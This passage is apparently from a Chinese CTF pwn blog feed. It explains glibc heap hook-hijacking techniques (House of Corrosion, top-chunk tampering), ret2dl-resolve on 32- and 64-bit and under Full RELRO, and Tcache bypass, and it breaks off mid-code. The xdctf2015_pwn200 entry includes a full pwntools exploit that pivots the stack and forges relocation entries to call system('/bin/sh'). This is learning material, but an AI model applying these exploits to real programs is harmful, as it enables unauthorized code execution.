title="1.篡改top域"></a>1.篡改top域</h3><p>通过改写main_arena，篡改top域并将top chunk转移到__free_hook之前，便可通过分配chunk劫持__free_hook</p><h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ol><li>前提是得能分配很大的chunk(分配很多次也行),因为实际上能伪造为top chunk的size域的地址离free__hook很远(glibc2.23这一偏移为0xb58)</li><li>攻击main_arena的top域也并非易事,malloc_hook-0x23(glibc2.23)处的字节错位得到的fake_chunk并不足以让你覆盖到top域(<del>有堆溢出就当我没说</del>)<br>  倒也有解决办法，虽然覆盖不了top域但可以覆盖fastbinsY数组,修改然后获得一个能覆盖到top域的chunk<br>(理论上是可行的，但实际过程遇到了很多高手情况,以后再回来复现吧…)</li></ol><h3 id="2-House-of-Corrosion"><a href="#2-House-of-Corrosion" class="headerlink" title="2.House of Corrosion"></a>2.House of Corrosion</h3><p>篡改global_max_fast为一个较大值(<code>Unsortedbin Attack</code>),然后计算__free_hook到FastbinY的偏移,再计算要伪造的bin的size</p><pre class=" language-python"><code class="language-python">fastbin_ptr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main_arena'</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span>idx<span class="token operator">=</span><span class="token punctuation">(</span>target_addr<span class="token operator">-</span>fastbin_ptr<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">8</span>size<span class="token operator">=</span>idx<span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span><span class="token number">0x20</span></code></pre><p>size计算简化之后是这样的</p><pre class=" language-python"><code class="language-python">chunk_size <span class="token operator">=</span> <span class="token punctuation">(</span>delta <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x20</span> ，delta为目标地址与fastbinY的offset</code></pre><p>然后free掉对应size的chunk，更改其的fd指针为目标值(在这里就是system函数地址)，再将A分配回来便完成劫持<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202211221629378.png"></p><h3 id="3-制造字节错位"><a href="#3-制造字节错位" class="headerlink" title="3.制造字节错位"></a>3.制造字节错位</h3><p>不方便利用不就是因为没有字节错位吗？制造一个就好了<code>Unsortedbin Attack</code>在__free_hook上方写入unsortedbin地址(0x7f开头)，然后正常<code>Fastbin Arbitrary Alloc</code>劫持</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://aidaip.github.io/binary/2020/02/20/House-of-Corrosion.html">AiDai  House of Corrosion</a><br><a href="https://zhuanlan.zhihu.com/p/448880453">House of Corrosion 原理及利用</a><br><a href="https://ray-cp.github.io/archivers/heap_global_max_fast_exploit">堆中global_max_fast相关利用</a><br><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">malloc_hook以及free_hook劫持原理</a><br><a href="https://lexsd6.github.io/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/">劫持hook函数</a></p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(2)：64位利用及Full RELRO</title>
      <link href="/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/"/>
      <url>/2022/11/18/ret2dl-resolve-2-64-wei-li-yong-ji-full-relro/</url>
      
        <content type="html"><![CDATA[<h1 id="64位ret2dl-resolve"><a href="#64位ret2dl-resolve" class="headerlink" title="64位ret2dl-resolve"></a>64位ret2dl-resolve</h1><h2 id="32位与64位差别"><a href="#32位与64位差别" class="headerlink" title="32位与64位差别"></a>32位与64位差别</h2><ol><li>相关结构体大小不同</li><li><code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>的参数reloc_arg在32位是地址偏移reloc_offset,在64位是reloc_index，含义是所重定位符号的重定位项在重定位表“.rel.plt”中的下标。重定位项地址reloc = JMPREL + reloc_index*3*8。</li><li>在这里直接引用<a href="https://sp4n9x.github.io/">Sp4n9x</a>师傅的一段话(<del>具体为啥会有问题我暂时也没理解到</del>)</li></ol><ul><li>64位情况下，bss节一般位于0x600000之后，重定位表“.rela.plt一般在0x400000左右，所以我们构造的r_info的高位(sym_index)和reloc_arg一般会很大。又因为计算符号项地址&amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)]和符号版本项地址vernum[ELFW(R_SYM) (reloc-&gt;r_info)]时，数组的数据类型的大小不同(symtab中的结构体大小为0x18字节，vernum的数据类型为uint16_t，大小为0x2字节)，这就导致vernum[ELFW(R_SYM) (reloc-&gt;r_info)]大概率会访问到0x400000到0x600000之间的不可读区域(64位下，这个区间一般不可读)，使得程序报错。</li></ul><pre class=" language-c"><code class="language-c">      <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token operator">-></span>l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> <span class="token operator">*</span>vernum <span class="token operator">=</span>        <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span><span class="token function">VERSYMIDX</span> <span class="token punctuation">(</span>DT_VERSYM<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">ElfW</span><span class="token punctuation">(</span>Half<span class="token punctuation">)</span> ndx <span class="token operator">=</span> vernum<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-></span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0x7fff</span><span class="token punctuation">;</span>      version <span class="token operator">=</span> <span class="token operator">&amp;</span>l<span class="token operator">-></span>l_versions<span class="token punctuation">[</span>ndx<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>version<span class="token operator">-></span>hash <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        version <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>所以我们要想办法进行绕过：(不绕过也是有很小几率成功的)</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL"><a href="#方案一：使l-gt-l-info-VERSYMIDX-DT-VERSYM-x3D-x3D-NULL" class="headerlink" title="方案一：使l->l_info[VERSYMIDX (DT_VERSYM)] == NULL"></a>方案一：使l-&gt;l_info[VERSYMIDX (DT_VERSYM)] == NULL</h3><p>l-&gt;l_info[VERSYMIDX (DT_VERSYM)] 的地址在64位是link_map+0x1c8,32位为link_map+0xe4<br>我们需要先泄露link_map地址，再将link_map+0x1c8设置成不为0。<br>之后就是和32位下的思路一样了，根据64位下的结构体伪造结构体，伪造reloc_arg来进行攻击。</p><h3 id="方案二：使sym-gt-st-other-x3D-x3D-0"><a href="#方案二：使sym-gt-st-other-x3D-x3D-0" class="headerlink" title="方案二：使sym->st_other== 0"></a>方案二：使sym-&gt;st_other== 0</h3><p>这应该是最普遍的做法吧<br>既然是绕过，干脆绕个大的，直接不进入最外层的判断</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>ST_VISIBILITY<span class="token punctuation">)</span> <span class="token punctuation">(</span>sym<span class="token operator">-></span>st_other<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>程序会把该函数判定为已解析过的函数，进入else语句中<br>else语句相当于将l-&gt;l_addr + sym-&gt;st_value的值存在value中,作为函数的真实地址</p><pre class=" language-c"><code class="language-c">  <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">/* We already found the symbol.  The module (and therefore its load     address) is also known.  */</span>      value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l<span class="token operator">-></span>l_addr <span class="token operator">+</span> sym<span class="token operator">-></span>st_value<span class="token punctuation">)</span><span class="token punctuation">;</span>      result <span class="token operator">=</span> l<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-c"><code class="language-c">DL_FIXUP_VALUE_TYPE value<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//DL_FIXUP_VALUE_TYPE是fixup/profile_fixup返回值的类型。保存函数的真实地址。</span></code></pre><pre class=" language-c"><code class="language-c">    lookup_t result<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//查找函数的结果，其为定义函数的共享对象的加载基地址</span></code></pre><p>我们可以选择把 sym-&gt;st_value 伪造为某个已解析函数的got表地址,如read.got ，再把 l-&gt;l_addr 改为 目标地址如 system 到 read 的偏移。那么我们的 value 最后就是 system地址。<br>要实现以上利用，我们需要伪造位于link_map+0x70的DT_SYMTAB指针、link_map+0xf8的DT_JMPREL指针、link_map+0x68的DT_STRTAB指针。之后就是伪造.dynamic中的DT_SYMTAB结构体和DT_JMPREL结构体以及函数所对应的Elf64_Rela结构体。为了方便，我在构造的过程中一般将reloc_index作为0来进行构造。<br>总的来说要满足以下条件(回忆一下延迟绑定的过程便很好理解)</p><ul><li>1.link_map中的DT_STRTAB、DT_SYMTAB、DT_JMPREL可读  </li><li>2.DT_SYMTAB结构体中的d_ptr即sym，(*(sym+5))&amp;0x03 != 0  </li><li>3.(reloc-&gt;r_info)&amp;0xff == 7  </li><li>4.rel_addr = l-&gt;addr + reloc-&gt;r_offset即原先需要修改的got表地址有可写权限  </li><li>5.l-&gt;l_addr + sym-&gt;st_value 为system的地址</li></ul><h1 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>Full RELRO</code>：继承<code>Partial RELRO</code>的所有保护，并且.got.plt被标为只读。此时延迟绑定技术被禁止，所有的外部函数地址将在程序装载时解析、装入，并标记为只读，不可更改。此时不需要link_map以及dl_runtime_resolve函数，则GOT表中这两项数据均置为0.</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><code>.dynamic</code>段中的以<code>DT_DEBUG</code>符号为关键字的值，指向了一个叫做<code>r_debug</code>结构体,其中的<code>r_map</code>字段即我们需要的<code>link_map</code>的地址<br>而至于<code>dl_runtime_resolve</code>函数，则可以从别的已加载进程序内存的且没有开<code>FULL RELRO</code>保护的<code>elf</code>(libc.so)的<code>GOT</code>中寻找.<br>link_map结构体内存在<code>l_next</code>和<code>l_prev</code>两个结构体指针可以让我们遍历到所有已加载进来的<code>elf</code>文件的<code>link_map</code>,再通过读取link_map中的<code>l_info[DT_PLTGOT]</code>是否为0来判断是否开启Full RELRO保护</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章<br><a href="https://bbs.pediy.com/thread-253833.htm#msg_header_h2_2">dl_runtime_resolve结合源码分析及常见的几种攻击手法</a><br><a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br><a href="https://www.cnblogs.com/pwnfeifei/p/15701859.html">ret2dl_resolve</a><br><a href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis#64%E4%BD%8Delf%E7%A8%8B%E5%BA%8F%E7%9A%84ret2dl_resolve">ret2dl_resolve解析</a><br><a href="https://www.cnblogs.com/winmt/articles/15692475.html">ret2dlresolve 与 改写got表</a><br><a href="https://www.testzero-wz.com/2022/03/05/Ret2dlresolve%E2%80%94%E2%80%94%E4%BB%8ENo-RELRO%E5%88%B0FULL-RELRO/#%E4%B8%80.-ret2dlresolve%E5%8E%9F%E7%90%86">Ret2dlresolve攻击——从No RELRO到FULL RELRO</a></p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ret2dl-resolve(1)：原理及基础利用</title>
      <link href="/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/"/>
      <url>/2022/11/14/ret2dl-resolve-1-yuan-li-ji-32-wei-ji-chu-li-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>ret2dl-resolve于2015年在论文_How the ELF Ruined Christmas_中被提出，作者是来自加州大学圣塔芭芭拉分校的Alessandro Di Federico等人。随着安全防御机制的不断完善，如今一个现代的漏洞利用通常包含两个阶段：</p><ol><li>通过信息泄露获得程序的内存布局</li><li>实际的漏洞利用</li></ol><p>然而，从程序中获得内存布局的方法并不总是可行的，且获得的被破坏的内存有时并不可靠。于是作者提出来ret2dl-resolve，巧妙地利用了ELF格式以及动态装载器的弱点，不需要进行信息泄露就可以直接标识关键函数的位置并调用。</p><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>如果之前没有理解动态链接的过程和相应的段、节等前置知识，理解ret2dl-resolve是有些困难的，在这里放下我学习时的资料：<br>完整动态链接过程：<a href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接</a>    <a href="https://www.jianshu.com/p/8dd91ec35dda">动态链接</a><br>相关的一些节、段的介绍：<a href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a><br>源码：<a href="https://man7.org/linux/man-pages/man5/elf.5.html">相关段、节源码</a></p><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>动态链接比静态链接要灵活得多，但它是以牺牲一部分性能为代价的。为优化动态链接性能，ELF采用了一种 <strong><code>延迟绑定(Lazy Binding)</code></strong> 的做法。基本思想就是当函数第一次被用到时才进行绑定(符号查找、重定位等)<br>具体流程引用一位师傅的图片<img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A.png"><br>用通俗一点(<del>不太准确</del>)的话描述一下过程(<del>我的理解</del>): ELF是通过函数<code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>实现绑定的.<br>$\color{pink}{第一步}$，每个导入函数都在PLT表中有一个条目，当函数第一次被调用时,程序通过call指令执行到该函数(以read举例)的read@plt条目的第一条指令，read@plt表的第一指令为跳转到read@got条目，而因为read函数是第一次被调用，此时read@got条目中存的是read@plt条目第二条指令的位置，再跳转回来相当于就是顺序执行read@plt的指令.<br>$\color{pink}{第二步}$，read@plt条目的第二条指令是将导入函数的标识(Elf_Rel在.rel.plt段中的偏移,也就是参数中的reloc_index)压入栈中，然后跳转到PLT0执行<br>$\color{pink}{第三步}$，PLT0包含两条指令，先将GOT[1]的值(也就是<code>_dl_runtime_resolve)</code>函数的第一个参数link_map_obj)压入栈中，然后跳转到GOT[2]保存的地址处，即<code>_dl_runtime_resolve)</code>函数.<br>$\color{pink}{第四步}$，<code>_dl_runtime_resolve)</code>函数完成地址的绑定，大概逻辑是这样的：<br>先通过link_map获得重定位函数所在了 libary 的基地址及<code>.dynamic</code>的地址，也就获得了.dynamic节中存有的其他和绑定相关的节(.dynsym .dynstr .rela.plt)的地址。利用第二个参数reloc_arg及rela.plt可以得到read函数在.dynsym中的下标，进而得到read函数符号表项<code>Elf32_Sym</code>(<code>Elf64_Sym</code>)的指针，记作sym。.dynstr节的地址+sym-&gt;st_name得到”read\x00”这一字符串的地址，再将字符串地址作为参数利用<code>_dl_lookup_symbol_x</code>函数在动态库中遍历搜索得到函数地址，填入read@got条目内并调用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li>关闭RELRO保护：即.dynamic段可写。动态装载器是通过.dynamic段来获取.dynstr节的地址，故可以通过改写.dynamic段相应DT_STRTAB来在任意地址伪造.dynstr节并欺骗动态装载器</li><li>开启Partial RELRO保护：通过伪造参数reloc_index可制造一个巨大的偏移，使得内存地址超出.rel.plt段来到.bss段，攻击者就可伪造fake_rel等结构欺骗动态装载器</li><li>Full RELRO: 详见(2)部分内容</li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_3.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_1.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_2.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 启动程序</span><span class="token comment" spellcheck="true"># io = remote('node4.buuoj.cn',26320)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = gdb.debug('./bof')</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc = ELF('./')</span><span class="token comment" spellcheck="true"># 源程序gadget</span>write_plt <span class="token operator">=</span> <span class="token number">0x80483C0</span>vuln <span class="token operator">=</span> <span class="token number">0x80484D6</span>bss_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_ebp <span class="token operator">=</span> <span class="token number">0x804862b</span>leave_ret <span class="token operator">=</span> <span class="token number">0x8048445</span>pop_ebx_esi_edi_ebp <span class="token operator">=</span> <span class="token number">0x8048628</span><span class="token comment" spellcheck="true"># 程序中section地址</span>plt0 <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrrel_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynsym <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynstr <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment" spellcheck="true"># 伪造相应结构</span>stack_size <span class="token operator">=</span> <span class="token number">0x800</span>base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_sizefake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">32</span>align <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span>fake_dynsym_addr <span class="token operator">+=</span> alignfake_dynstr_addr <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span>st_name <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">-</span> dynstrst_value <span class="token operator">=</span> <span class="token number">0</span>st_size <span class="token operator">=</span> <span class="token number">0</span>st_info <span class="token operator">=</span> <span class="token number">0x12</span><span class="token comment" spellcheck="true">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_value<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_size<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_info<span class="token punctuation">)</span>fake_rel_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">24</span>reloc_arg <span class="token operator">=</span> fake_rel_addr<span class="token operator">-</span>rel_pltr_sym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x10</span>r_type <span class="token operator">=</span> <span class="token number">0x7</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_sym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r_type<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>r_offset <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>fake_dynstr <span class="token operator">=</span> b<span class="token string">'system\x00'</span><span class="token comment" spellcheck="true"># stack pivot</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token number">-4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_migrate<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ret2dl_resolve</span>binsh_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">80</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> b<span class="token string">'/bin/sh\x00'</span>payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token string">'a'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章！<br>最最最详细(包括64位利用细节)：<a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br>最最最容易理解：<a href="https://zikh26.github.io/posts/ba418f23.html">关于ret2_dl_runtime_resolve的学习总结</a><br>以及CTF权威指南(Pwn篇)</p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache机制绕过</title>
      <link href="/2022/11/10/tcache-ji-zhi-rao-guo/"/>
      <url>/2022/11/10/tcache-ji-zhi-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。<br>对攻击者而言,Tcache的不安全机制为攻击者带来了大量新的漏洞利用方式，但同时也使先前的一些利用方法(如Unsortedbin Attak)等漏洞利用减弱甚至失效，并且在一些题中Tcache的利用会相当麻烦。故本文探究Tcache机制的绕过方法(glibc2.26-2.27)</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="1-分配大小不在Tcache范围内的堆块"><a href="#1-分配大小不在Tcache范围内的堆块" class="headerlink" title="1.分配大小不在Tcache范围内的堆块"></a>1.分配大小不在Tcache范围内的堆块</h2><p>好像说了句废话，不过在某些题中还是有用的.<br>Tcache的chunk范围在0x410(1032)字节以内</p><h2 id="2-填满Tcache"><a href="#2-填满Tcache" class="headerlink" title="2.填满Tcache"></a>2.填满Tcache</h2><p>好像也是句废话<br>free某个tcache超过7次，也就是将存放在tcache结构体中的该范围bins的数量占满，后续free的堆块就会放到相应的bin中</p><h2 id="3-修改Tcache结构体中的counts域"><a href="#3-修改Tcache结构体中的counts域" class="headerlink" title="3.修改Tcache结构体中的counts域"></a>3.修改Tcache结构体中的counts域</h2><p>所谓的绕过Tcache机制，无非就是使释放的堆块不进入Tcache中，分配的堆块不从Tcache中取出.</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>如果我们想让释放的堆块不进入Tcache中，就需要对应Tcache bin的counts域不小于tcache_count(默认为7)，即Tcache已满.但如过counts域不为0，在分配堆块时就一定会从Tcache中取出,前后两个发生冲突.</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>下面是tcache_put的调用过程</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>          <span class="token comment" spellcheck="true">/* Fill cache first, return to user only if cache fills.         We may return one of these chunks later.  */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">tcache_put</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>          return_cached <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>          <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>        <span class="token punctuation">}</span></code></pre><p>重点关注这一条件判断，如果我们能绕过这一判断进入else，就能实现绕过Tcache机制进行堆块分配</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token 